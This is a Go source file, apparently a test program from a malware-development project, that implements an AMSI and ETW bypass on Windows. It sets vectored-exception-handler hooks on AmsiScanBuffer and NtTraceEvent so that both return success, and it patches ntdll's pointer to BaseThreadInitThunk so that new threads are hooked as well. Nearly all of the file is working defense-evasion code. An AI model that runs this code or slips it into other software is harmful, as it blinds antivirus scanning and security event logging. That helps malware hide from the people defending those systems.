package main

import (
	"fmt"
	"sync/atomic"
	"time"
	"unsafe"

	"github.com/redt1de/malice/pkg/callz/ntd"
	"github.com/redt1de/malice/pkg/mem"
	"github.com/redt1de/malice/pkg/veh"
	"golang.org/x/sys/windows"
)

// GOOS=windows GOARCH=amd64 go build -o /work/maldev/testing/veh.exe cmd/veh/vehamsi.go

func main() {
	test := windows.NewLazyDLL("amsi.dll")
	pAmsiScanBuffer := test.NewProc("AmsiScanBuffer")

	test2 := windows.NewLazyDLL("ntdll.dll")
	pNtTraceEvent := test2.NewProc("NtTraceEvent")
	println("Setting VEH hooks...")
	vhAmsi, _ := veh.New(pAmsiScanBuffer.Addr(), handler)
	vhEtw, _ := veh.New(pNtTraceEvent.Addr(), handler)
	thds, _ := EnumThreads()
	for _, t := range thds {
		e := vhEtw.SetThread(t)
		if e != nil {
			// fmt.Println(e)
		}
		e = vhAmsi.SetThread(t)
		if e != nil {
			// fmt.Println(e)
		}
	}

	// calls from the BTIT stub do not work yet, for now just incrementing a global var "Hit" and watching it in a goroutine
	go func() {
		for {
			if Hit > 0 {
				println("HIT!")
				thds, _ := EnumThreads()
				for _, t := range thds {
					e := vhEtw.SetThread(t)
					if e != nil {
						// fmt.Println(e)
					}
					e = vhAmsi.SetThread(t)
					if e != nil {
						// fmt.Println(e)
					}
				}
				Hit = 0
			}
		}
	}()
	hookNewThreads()
	println("Spawning new thread...")
	k32 := windows.NewLazyDLL("kernel32.dll")
	ct := k32.NewProc("CreateThread")
	var s string

	ct.Call(0, 0, windows.NewCallback(testThread), 0, 0, 0)
	println("press enter to exit...")
	// fmt.Scanln(&s)
	// ct.Call(0, 0, windows.NewCallback(testThread), 0, 0, 0)
	// ct.Call(0, 0, windows.NewCallback(testThread), 0, 0, 0)
	// println("press enter to exit...")
	// fmt.Scanln(&s)

	r1, _, _ := pAmsiScanBuffer.Call(0, 0, 0, 0)
	fmt.Printf(">>> [hooked] AmsiScanBuffer: should return S_OK (0x0) -> 0x%x\n", r1)

	r1, _, _ = pNtTraceEvent.Call(0, 0, 0, 0)
	fmt.Printf(">>> [hooked] NtTraceEvent: should return STATUS_SUCCESS (0x0) -> 0x%x\n", r1)
	println("press enter to exit...")
	fmt.Scanln(&s)
}

//go:nosplit
func handler(ctx *veh.CONTEXT) uintptr {
	a := mem.ReadQword(uintptr(ctx.Rsp))
	ctx.Rip = uint64(a)
	ctx.Rsp += 8
	ctx.Rax = 0x0
	return 0
}

func EnumThreads() ([]uint32, error) {
	var ret []uint32
	curProc := windows.GetCurrentProcessId()
	snaphand, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return []uint32{}, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(snaphand)
	var entry windows.ThreadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	windows.Thread32First(snaphand, &entry)

	if entry.OwnerProcessID == curProc {
		// vh.EnableForThread(entry.ThreadID)
		ret = append(ret, entry.ThreadID)
	}
	for {
		if err := windows.Thread32Next(snaphand, &entry); err != nil {
			break
		}
		if entry.OwnerProcessID == curProc {
			// vh.EnableForThread(entry.ThreadID)
			ret = append(ret, entry.ThreadID)
		}

	}
	return ret, nil
}

// /////////////////////////////////////////////////////////////////////////////////
func MyBaseThreadInitThunk(LdrReserved uint32, lpStartAddress uintptr, lpParameter uintptr)
func getAddr() uintptr
func printf(format string, a ...interface{}) { fmt.Printf(format, a...) }

var RealBaseThreadInitThunkAddr uintptr
var btit *windows.LazyProc
var Hit uintptr

func hookNewThreads() {
	n := ntd.NewNtDll()
	k32 := windows.NewLazyDLL("kernel32.dll")

	btit = k32.NewProc("BaseThreadInitThunk")
	RealBaseThreadInitThunkAddr = btit.Addr()
	printf("real BaseThreadInitThunk: 0x%x\n", RealBaseThreadInitThunkAddr)
	var dataAddr, injectPoint uintptr
	var dataSize uint32
	for _, s := range n.Pe.Sections {
		if s.Name == ".data" {
			dataAddr = n.Start + uintptr(s.VirtualAddress)
			dataSize = s.VirtualSize
			printf("data section: 0x%x %d\n", dataAddr, dataSize)
		}
	}

	for i := uint32(0); i < dataSize; i++ {
		if *(*uintptr)(unsafe.Pointer(dataAddr + uintptr(i))) == RealBaseThreadInitThunkAddr {
			injectPoint = dataAddr + uintptr(i)
			printf("found BaseThreadInitThunk int ntdlls .data section at 0x%x\n", injectPoint)
			break
		}
	}

	fnPtr := getAddr()
	printf("our function: 0x%x\n", fnPtr)

	didit := atomic.CompareAndSwapUintptr((*uintptr)(unsafe.Pointer(injectPoint)), RealBaseThreadInitThunkAddr, fnPtr)
	printf("didit: %v\n", didit)

}

func testThread() uintptr {
	for i := 0; i < 2; i++ {
		time.Sleep(1 * time.Second)
		println("threadFunc")
	}
	test := windows.NewLazyDLL("amsi.dll")
	pAmsiScanBuffer := test.NewProc("AmsiScanBuffer")

	test2 := windows.NewLazyDLL("ntdll.dll")
	pNtTraceEvent := test2.NewProc("NtTraceEvent")
	r1, _, _ := pAmsiScanBuffer.Call(0, 0, 0, 0)
	fmt.Printf(">>> [IN THREAD] [hooked] AmsiScanBuffer: should return S_OK (0x0) -> 0x%x\n", r1)

	r1, _, _ = pNtTraceEvent.Call(0, 0, 0, 0)
	fmt.Printf(">>> [IN THREAD] [hooked] NtTraceEvent: should return STATUS_SUCCESS (0x0) -> 0x%x\n", r1)
	return 0
}
